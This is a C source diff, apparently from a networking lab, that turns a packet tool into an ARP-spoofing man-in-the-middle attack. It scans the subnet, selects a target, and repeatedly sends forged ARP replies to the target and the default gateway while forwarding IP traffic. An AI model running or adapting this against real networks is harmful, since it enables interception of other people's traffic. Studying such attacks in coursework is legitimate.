@@ -99,6 +99,11 @@ int main_proc3(netdevice_t *p) {
   ipaddr_t ip;
   int key;
 
+  ipethaddr_t *target;
+  extern uint8_t *myroutereth;
+  extern uint8_t *targetip;
+  extern uint8_t *targeteth;
+
   // 利用 ARP request 掃描子網
   arp_scan(p);
 
@@ -109,10 +114,6 @@ int main_proc3(netdevice_t *p) {
     if (netdevice_rx(p) == -1) {
       break;
     }
-
-    /*----------------------------------*
-     * Other works can be inserted here *
-     *----------------------------------*/
 
     /*
      * If key is not pressed, continue to next loop
@@ -129,22 +130,51 @@ int main_proc3(netdevice_t *p) {
     ungetc(key, stdin);
 
     if (key == 'a') {
-      ipethaddr_t *ip_eth_p = arptable_select();
-      uint8_t *defareth = arptable_existed(defarpip);
-
-      // 騙目標主機
-      arp_spoof(p, ip_eth_p->eth, &(ip_eth_p->ip), defarpip);
-      // 騙預設閘道器
-      arp_spoof(p, defareth, defarpip, &(ip_eth_p->ip));
+      target = arptable_select();
+      targetip = &(target->ip);
+      targeteth = target->eth;
+      myroutereth = arptable_existed(defarpip);
+      break;
     }
 
     if (fgets(buf, MAX_LINEBUF, stdin) == NULL) {
       break;
     }
-    if ((ip = retrieve_ip_addr(buf)) == 0) {
-      printf("Invalid IP (Enter to exit)\n");
-    } else {
-      arp_request(p, (unsigned char *)&ip);
+  }
+
+  int cnt = 0;
+  while (1) {
+    /*
+     * Proccess packets in the capture buffer
+     */
+    if (netdevice_rx_transfer(p) == -1) {
+      break;
+    }
+
+    if (cnt % 1000000 == 0) {
+      // 騙目標主機
+      arp_spoof(p, targeteth, targetip, myrouterip);
+      // 騙預設閘道器
+      arp_spoof(p, myroutereth, myrouterip, targetip);
+    }
+    cnt++;
+
+    /*
+     * If key is not pressed, continue to next loop
+     */
+    if (!readready()) {
+      continue;
+    }
+    /*
+     * If user pressed enter, exit the program
+     */
+    if ((key = fgetc(stdin)) == '\n') {
+      break;
+    }
+    ungetc(key, stdin);
+
+    if (fgets(buf, MAX_LINEBUF, stdin) == NULL) {
+      break;
     }
   }
 }
@@ -240,8 +270,8 @@ int main(int argc, char *argv[]) {
    * Register the packet handler callback of specific protocol
    */
   netdevice_add_proto(p, ETH_ARP, (ptype_handler)&arp_main);
-  netdevice_add_proto(p, ETH_IP, (ptype_handler)&ip_main);
-  tcp_set_raw_handler((tcp_raw_handler)&rcvd_raw_tcp);
+  netdevice_add_proto(p, ETH_IP, (ptype_handler)&ip_main_transfer);
+  // tcp_set_raw_handler((tcp_raw_handler)&rcvd_raw_tcp);
 
   main_proc3(p);
 
